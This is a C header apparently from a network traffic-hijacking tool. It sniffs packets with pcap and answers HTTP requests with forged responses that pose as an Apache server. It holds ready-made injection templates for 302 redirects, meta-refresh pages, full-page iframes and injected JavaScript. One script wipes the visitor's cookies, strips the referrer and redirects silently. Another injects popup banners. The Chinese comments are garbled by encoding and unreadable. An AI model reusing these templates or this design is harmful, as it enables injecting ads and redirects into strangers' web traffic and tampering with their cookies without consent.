#ifndef __PROCESS_H__
#define __PROCESS_H__

#include "sysdef.h"

/* http request fieled length */
#define MAX_HOST_LEN        128
#define MAX_URI_LEN         4096
#define MAX_URL_LEN         4096   /* ע��:�����ļ�dest_page���Ȳ��ܳ����˳��ȣ����򻺳������ */
#define MAX_AGENT_LEN       1024
#define MAX_REF_LEN         1024
#define MAX_COOKIE_LEN      4096
#define MAX_REQ_WITH_LEN    512
#define MAX_PAYLOAD_LEN     65535

/*
 * ��־λ˵��:
 * �Ӹ�λ����λ����: [referer��ȫ�ְ�������־λ][agent��ȫ�ְ�������־λ][ȫ�ְ�������־λ][pos��־λ][cookie��־λ][type_repley��־λ]
 * ÿ����־λռ4λ��
 * referer:0-����referer��ȫ�ֹ���1-��ƥ��referer��ȫ�ֹ������У�2-ƥ��referer��ȫ�ֹ�������
 * agent:0-����agent��ȫ�ֹ���1-��ƥ��agent��ȫ�ֹ������У�2-ƥ��agent��ȫ�ֹ�������
 * ȫ�ְ�������־λ:0-����ȫ�ְ���������1-��ƥ��urlȫ�ְ������������У�2-��ƥ��refererȫ�ְ�������������
 *                  3-��ƥ��urlȫ�ְ����������Ҳ�ƥ��refererȫ�ְ�������������
 * pos:URLƥ���λ��
 * cookie:0-������cookie,1-����cookie
 * type_repley:�滻����
 */

enum type_repled {
    REDIRECT_TYPE_REFRESH,           /* 0: �޿�� */
    REDIRECT_TYPE_IFRAME,            /* 1: �п�� */
    REDIRECT_TYPE_302,               /* 2: 302 �ض��� */
    REDIRECT_TYPE_NOREFERER,         /* 3: NOREFERER */
    REDIRECT_TYPE_JS_IFRAME,         /* 4: ҳ�����滻 */
    REDIRECT_TYPE_JS,                /* 5: Ƕ��js���� */
    REDIRECT_TYPE_JSBODY,            /* 6: ΢�Ź��ں�ҵ��ҳ�浯��banner */
    REDIRECT_TYPE_JSON,              /* 7: ����json���� */
    REDIRECT_TYPE_MAX
};

enum type_filter {
    FILTER_NONE,        /*0: ������ */
    FILTER_URL,         /*1: ����ƥ���ϵ�URL */
    FILTER_REFERER,     /*2: ����ƥ���REFERER */
    FILTER_ALL          /*3: ����ƥ���ϵ�URL��REFEER  */
};

/* cookie���ִ������� */
enum process_cookie {
    COOKIE_NOT_SET,       /* 0: ������--���е�ǰ���� */
    COOKIE_SET            /* 1: ����ƥ���ϵ�cookie---��ƥ������е�ǰ���� */
};

enum filter_result {
    FILTER_NULL,        /*0: ������--���е�ǰ���� */
    FILTER_MATCHED,     /*1: ����ƥ���ϵ�---��ƥ������е�ǰ���� */
    FILTER_NOMATCHED    /*2: ����ûƥ���---ƥ���ϵ����е�ǰ���� */
};

/* ��ȡ�����*/
#define RANDOM_NUM  (rand()%100)

#define HTTP_RESP_200OK_HEADER "HTTP/1.1 200 OK\r\nServer: Apache\r\nConnection: close\r\nContent-Type: text/html; charset=gbk"
#define HTTP_RESP_200OK_JSON_HEADER "HTTP/1.1 200 OK\r\nServer: Apache\r\nContent-Type: text/plain"
#define HTTP_RESP_302_HEADER "HTTP/1.1 302 Found\r\nServer: Apache\r\nConnection: close\r\nContent-Type: text/html; charset=gbk\r\nLocation: http://"
#define HTTP_RESP_IFRAME_BEGIN "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body style=\"overflow:hidden\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\"><iframe frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" border=\"0\" scrolling=\"auto\" height=\"100%\" width=\"100%\" src=\"http://"
#define HTTP_RESP_IFRAME_END "\"></iframe></body></html>"
#define HTTP_RESP_REFRESH_BEGIN "<!DOCTYPE html><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'><meta http-equiv=\"refresh\" content=\"0; url=http://"
#define HTTP_RESP_REFRESH_END "\"></head><body></body></html>"
#define HTTP_RESP_NOREFERER_BEGIN "<!DOCTYPE html><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body><script type=\"text/javascript\">var u='http://"
#define HTTP_RESP_NOREFERER_END "', ua=navigator.userAgent.toLowerCase(), hs=window.location.host, n=hs.indexOf(\".\"), d=hs.substr(n+1);var cc=document.cookie.split(\";\");for(var i=0;i<cc.length;i++){var name=cc[i].split(\"=\")[0];if(\"apxlp\"!=name){document.cookie=name+\"=; domain=\"+d+\"; path=/; expires=Thu, 01 Jan 1970 00:00:01 GMT;\"}}if(ua.indexOf(\"applewebkit\")>0){var h=document.createElement(\"a\");h.rel=\"noreferrer\";h.href=u;document.body.appendChild(h);var evt=document.createEvent(\"MouseEvents\");evt.initEvent(\"click\",true,true);h.dispatchEvent(evt)}else{document.write('<meta http-equiv=\"Refresh\" Content=\"0; Url='+u+'\">')}</script></body></html>"
#if 1
#define HTTP_RESP_JS_IFRAME_BEGING "<html><head><script type=\"text/javascript\">function s(){"
#define HTTP_RESP_JS_IFRAME_MIDDLE "}</script><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body style=\"overflow:hidden\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\" onload=\"s()\"><iframe id=\"f\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" border=\"0\" scrolling=\"auto\" height=\"100%\" width=\"100%\" src=\"http://"
#else
#define HTTP_RESP_JS_IFRAME_BEGING "<!DOCTYPE html><html><head><script type=\"text/javascript\" src=\""
#define HTTP_RESP_JS_IFRAME_MIDDLE "\"></script><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body style=\"overflow:hidden\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\" onload=\"setParameter()\"><iframe id=\"frame_A\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" border=\"0\" scrolling=\"auto\" height=\"100%\" width=\"100%\" src=\"http://"
#endif
#define HTTP_RESP_JS_IFRAME_END "?rsv_upd=1\"></iframe></body></html>"

#define HTTP_RESP_JS_HEADER "HTTP/1.1 200 OK\r\nServer: Apache\r\nConnection: close\r\nContent-Type: application/javascript\r\nCache-Control: no-cache"
#define HTTP_RESP_JS_BEGING "var u='http://"
#define HTTP_RESP_JS_MIDDLE "';"

#define HTTP_RESP_JSBODY_BEGING "<!DOCTYPE html><html><head><script type=\"text/javascript\">function s(){"
#define HTTP_RESP_JSBODY_END    "}</script><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body onload=\"s()\"></body></html>"

typedef struct http_request_s {
  char* host;
  unsigned int host_len;
    
  char* uri;
  unsigned int uri_len;

  char* url;
  unsigned int url_len;
    
  char* referer;
  unsigned int referer_len;
    
  char* cookie;
  unsigned int cookie_len;
    
  char* user_agent;
  unsigned int user_agent_len;
}http_request_t;

typedef struct http_response_s {
  int index;
  char *url;
  char *cookie;
  unsigned char *payload;
}http_response_t;


struct http_response_element_s {
    char*           header;
    unsigned int    header_len;
    char*           resp_body_start;
    unsigned int    resp_body_start_len;
    char*           resp_body_middle;
    unsigned int    resp_body_middle_len;
    char*           resp_body_end;
    unsigned int    resp_body_end_len;
};

#define check_crlf(header, len)                                 \
  (((len) == 1 && header[0] == '\n') ||                         \
   ((len) == 2 && header[0] == '\r' && header[1] == '\n'))


struct http_request_s* http_new_request(void);

void http_free_request(struct http_request_s * r);

struct http_response_s* http_new_response(void);

void http_free_response(struct http_response_s * p);

void process_pkt(unsigned char* arg, const struct pcap_pkthdr* pkthdr, const unsigned char* packet);

void init_resp_table();


#endif
